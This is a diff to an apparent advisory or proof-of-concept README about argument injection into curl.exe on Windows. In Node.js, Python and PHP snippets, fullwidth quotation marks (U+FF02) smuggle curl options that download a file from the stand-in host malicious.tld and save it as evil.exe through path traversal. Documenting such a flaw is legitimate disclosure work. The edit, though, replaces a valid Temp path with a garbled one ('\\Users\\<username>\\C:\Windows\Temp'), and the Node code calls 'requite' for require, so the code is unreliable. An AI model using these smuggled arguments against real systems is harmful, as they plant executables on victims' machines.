@@ -77,20 +77,20 @@ Ensure to substitute `malicious.tld` and `<username>` in the following scripts w
 In Node.js:
 ```javascript
 const child_process = requite('child_process');
-const arg = "name=meow\u{FF02} malicious.tld \u{FF02}-o-\u{FF02} \u{FF02}-o ..\..\..\..\..\..\..\..\..\\Users\\<username>\\AppData\\Local\\Temp\\evil.exe";
+const arg = "name=meow\u{FF02} malicious.tld \u{FF02}-o-\u{FF02} \u{FF02}-o ..\..\..\..\..\..\..\..\..\\Users\\<username>\\C:\Windows\Temp\evil.exe";
 child_process.spawnSync("curl.exe", ["https://example.com/", "--data", arg]);
 ```
 
 In Python:
 ```python
 import subprocess
-arg = "name=meow\uFF02 malicious.tld \uFF02-o-\uFF02 \uFF02-o ..\..\..\..\..\..\..\..\..\\Users\\<username>\\AppData\\Local\\Temp\\evil.exe"
+arg = "name=meow\uFF02 malicious.tld \uFF02-o-\uFF02 \uFF02-o ..\..\..\..\..\..\..\..\..\\Users\\<username>\\C:\Windows\Temp\evil.exe"
 subprocess.run(['curl.exe', "https://example.com/", "--data", arg])
 ```
 
 In PHP:
 ```php
-define("arg", "name=meow\u{FF02} malicious.tld \u{FF02}-o-\u{FF02} \u{FF02}-o ..\..\..\..\..\..\..\..\..\\Users\\<username>\\AppData\\Local\\Temp\\evil.exe");
+define("arg", "name=meow\u{FF02} malicious.tld \u{FF02}-o-\u{FF02} \u{FF02}-o ..\..\..\..\..\..\..\..\..\\Users\\<username>\\C:\Windows\Temp\evil.exe");
 proc_open(['curl.exe', "https://example.com/", "--data", arg], [], $pipes);
 // or
 system(sprintf("curl.exe https://example.com/ --data %s", escapeshellarg(arg)));
